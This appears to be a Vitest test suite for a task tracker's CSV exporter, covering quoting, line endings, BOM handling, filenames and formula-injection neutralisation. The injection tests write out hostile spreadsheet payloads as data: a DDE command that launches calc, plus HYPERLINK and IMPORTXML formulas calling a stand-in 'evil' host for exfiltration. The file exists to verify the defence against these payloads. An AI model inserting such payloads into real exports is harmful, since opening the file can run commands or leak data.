import { describe, expect, it, vi, afterEach } from 'vitest';

import { UTF8_BOM, csvFilename, downloadCsv, escapeCsvField, toCsv } from '@/lib/csv';

/**
 * The escaping matrix is the point of this suite.
 *
 * Every one of these cases is a bug that has shipped in someone's CSV exporter:
 * an unquoted comma that splits a row, an unescaped quote that swallows the
 * rest of the file, a bare LF that ends a record early, a missing BOM that
 * turns Arabic into mojibake in Excel. They are asserted individually rather
 * than through one big golden string so a failure names the rule that broke.
 */

const H = [
  { key: 'key', label: 'Key' },
  { key: 'title', label: 'Title' },
] as const;

/** The document minus its BOM — most assertions are about the records. */
function body(csv: string): string {
  return csv.startsWith(UTF8_BOM) ? csv.slice(UTF8_BOM.length) : csv;
}

describe('escapeCsvField', () => {
  it('leaves a plain value untouched', () => {
    expect(escapeCsvField('FB-142')).toBe('FB-142');
  });

  it('quotes a value containing a comma', () => {
    expect(escapeCsvField('Fix, urgently')).toBe('"Fix, urgently"');
  });

  it('quotes and doubles an embedded double quote', () => {
    expect(escapeCsvField('say "hi"')).toBe('"say ""hi"""');
  });

  it('quotes a value containing a bare LF', () => {
    expect(escapeCsvField('line one\nline two')).toBe('"line one\nline two"');
  });

  it('quotes a value containing a bare CR', () => {
    expect(escapeCsvField('line one\rline two')).toBe('"line one\rline two"');
  });

  it('quotes a value containing CRLF', () => {
    expect(escapeCsvField('a\r\nb')).toBe('"a\r\nb"');
  });

  it('renders null and undefined as an empty field', () => {
    expect(escapeCsvField(null)).toBe('');
    expect(escapeCsvField(undefined)).toBe('');
  });

  it('renders a fractional number with Latin digits and a dot', () => {
    expect(escapeCsvField(0.5)).toBe('0.5');
  });

  it('renders zero rather than treating it as empty', () => {
    expect(escapeCsvField(0)).toBe('0');
  });

  it('leaves a value with only spaces or a semicolon unquoted', () => {
    // Neither is a special character in RFC 4180 — quoting them would be noise.
    expect(escapeCsvField(' spaced ')).toBe(' spaced ');
    expect(escapeCsvField('ui;bug')).toBe('ui;bug');
  });

  it('passes Arabic text through unchanged', () => {
    expect(escapeCsvField('إصلاح عاجل')).toBe('إصلاح عاجل');
  });
});

/**
 * CSV injection.
 *
 * A task title is text a stranger typed, and a spreadsheet evaluates a cell
 * that STARTS with a formula character. Every case below is a payload that
 * executes on open in at least one of Excel / LibreOffice / Sheets, so the
 * matrix is asserted lead-character by lead-character rather than through one
 * representative string.
 */
describe('escapeCsvField — formula neutralisation', () => {
  it.each([
    ['equals', '=1+1', "'=1+1"],
    ['plus', '+1+1', "'+1+1"],
    ['at', '@SUM(A1:A9)', "'@SUM(A1:A9)"],
    ['tab', '\t=1+1', "'\t=1+1"],
    ['the DDE payload', "=cmd|'/C calc'!A0", "'=cmd|'/C calc'!A0"],
    ['a hyperlink exfiltration', '=HYPERLINK("http://evil","click")', undefined],
  ])('guards a value led by %s', (_name, input, expected) => {
    const escaped = escapeCsvField(input);
    // The payloads carrying a comma or a quote are ALSO quoted, so those cases
    // assert the prefix rather than the whole string.
    if (expected === undefined) expect(escaped.startsWith(`"'=`)).toBe(true);
    else expect(escaped).toBe(expected);
  });

  it('guards BEFORE quoting, so a hostile value with a comma survives both rules', () => {
    // The `'` is inside the quotes: a reader un-quotes first, and what it hands
    // the cell is still text.
    expect(escapeCsvField('=A1,B1')).toBe('"\'=A1,B1"');
  });

  it('guards a hostile value containing a quote, doubling the quote as usual', () => {
    expect(escapeCsvField('=IMPORTXML("http://evil","//a")')).toBe(
      '"\'=IMPORTXML(""http://evil"",""//a"")"',
    );
  });

  it.each([
    ['a task key', 'FB-142'],
    ['a title with an interior equals', 'Fix a=b parsing'],
    ['a title with an interior plus', 'C++ migration'],
    ['an email in the middle', 'ping ada@flowboard.dev'],
    ['Arabic prose', 'إصلاح عاجل'],
    ['a leading space', ' spaced '],
  ])('leaves %s alone — only the FIRST character decides', (_name, input) => {
    expect(escapeCsvField(input)).toBe(input);
  });

  /**
   * THE DOCUMENTED TRADEOFF (see `escapeCsvField`). The guard fires on any
   * leading `-`, including one that opens a genuine negative number: a
   * "is this really a number" carve-out is a second parser, and every place it
   * disagrees with the spreadsheet's is a bypass. FlowBoard exports no signed
   * numeric column today (story points are 0–1000), so the cost is currently
   * theoretical — but it is real and it is asserted here rather than left to be
   * discovered.
   */
  describe('the leading-hyphen tradeoff', () => {
    it('guards a negative number, which therefore lands in the cell as text', () => {
      expect(escapeCsvField(-5)).toBe("'-5");
      expect(escapeCsvField('-5')).toBe("'-5");
    });

    it('guards the payload that a "plain number" carve-out would have to catch', () => {
      expect(escapeCsvField("-5+cmd|'/C calc'!A0")).toBe("'-5+cmd|'/C calc'!A0");
    });

    it('leaves a non-negative number numeric — the columns FlowBoard actually exports', () => {
      expect(escapeCsvField(0)).toBe('0');
      expect(escapeCsvField(0.5)).toBe('0.5');
      expect(escapeCsvField(13)).toBe('13');
    });
  });
});

describe('toCsv', () => {
  it('prefixes the document with a UTF-8 BOM', () => {
    expect(toCsv([], H).startsWith(UTF8_BOM)).toBe(true);
  });

  it('writes the localized header labels as the first record', () => {
    expect(body(toCsv([], H))).toBe('Key,Title');
  });

  it('escapes header labels too', () => {
    const csv = toCsv([], [{ key: 'a', label: 'Points, story' }]);
    expect(body(csv)).toBe('"Points, story"');
  });

  it('separates records with CRLF, not LF', () => {
    const csv = body(toCsv([{ key: 'FB-1', title: 'One' }], H));
    expect(csv).toBe('Key,Title\r\nFB-1,One');
    expect(csv.includes('\n\n')).toBe(false);
  });

  it('does not terminate the document with a trailing newline', () => {
    const csv = toCsv([{ key: 'FB-1', title: 'One' }], H);
    expect(csv.endsWith('\r\n')).toBe(false);
  });

  it('follows the header order, not the row key order', () => {
    const csv = body(toCsv([{ title: 'One', key: 'FB-1' }], H));
    expect(csv).toBe('Key,Title\r\nFB-1,One');
  });

  it('emits an empty field for a key the row does not carry', () => {
    const csv = body(toCsv([{ key: 'FB-1' }], H));
    expect(csv).toBe('Key,Title\r\nFB-1,');
  });

  it('keeps a multi-line field inside one record', () => {
    const csv = body(toCsv([{ key: 'FB-1', title: 'a\nb' }], H));
    expect(csv).toBe('Key,Title\r\nFB-1,"a\nb"');
  });

  it('writes header-only output for an empty row set', () => {
    expect(body(toCsv([], H))).toBe('Key,Title');
  });

  it('handles the full escaping matrix in one document', () => {
    const csv = body(
      toCsv(
        [
          { key: 'FB-1', title: 'Fix, urgently' },
          { key: 'FB-2', title: 'say "hi"' },
          { key: 'FB-3', title: null },
        ],
        H,
      ),
    );

    expect(csv.split('\r\n')).toEqual([
      'Key,Title',
      'FB-1,"Fix, urgently"',
      'FB-2,"say ""hi"""',
      'FB-3,',
    ]);
  });

  it('neutralises a formula-shaped title, and a formula-shaped HEADER label too', () => {
    // Headers go through the same function: a column label is localized text,
    // and a catalog is still a place a string arrives from.
    const csv = body(
      toCsv(
        [{ key: 'FB-1', title: "=cmd|'/C calc'!A0" }],
        [
          { key: 'key', label: 'Key' },
          { key: 'title', label: '=Title' },
        ],
      ),
    );

    expect(csv.split('\r\n')).toEqual(["Key,'=Title", "FB-1,'=cmd|'/C calc'!A0"]);
  });
});

describe('csvFilename', () => {
  it('stamps the local calendar day and a .csv extension', () => {
    expect(csvFilename('FLOW-tasks', new Date(2026, 1, 3))).toBe('FLOW-tasks-2026-02-03.csv');
  });

  it('replaces filesystem-hostile characters in the prefix', () => {
    expect(csvFilename('FB / tasks', new Date(2026, 0, 9))).toBe('FB-tasks-2026-01-09.csv');
  });

  it('falls back to a generic prefix when nothing usable survives', () => {
    expect(csvFilename('///', new Date(2026, 0, 9))).toBe('export-2026-01-09.csv');
  });
});

describe('downloadCsv', () => {
  afterEach(() => {
    vi.unstubAllGlobals();
    vi.restoreAllMocks();
  });

  it('revokes the object URL even when the click throws', () => {
    const createObjectURL = vi.fn(() => 'blob:fb');
    const revokeObjectURL = vi.fn();
    vi.stubGlobal('URL', { createObjectURL, revokeObjectURL });
    vi.stubGlobal(
      'Blob',
      class {
        constructor(readonly parts: unknown[]) {}
      },
    );
    vi.stubGlobal('document', {
      createElement: () => ({
        click() {
          throw new Error('blocked');
        },
      }),
    });

    expect(() => {
      downloadCsv('x.csv', 'a');
    }).toThrow('blocked');
    expect(revokeObjectURL).toHaveBeenCalledWith('blob:fb');
  });
});
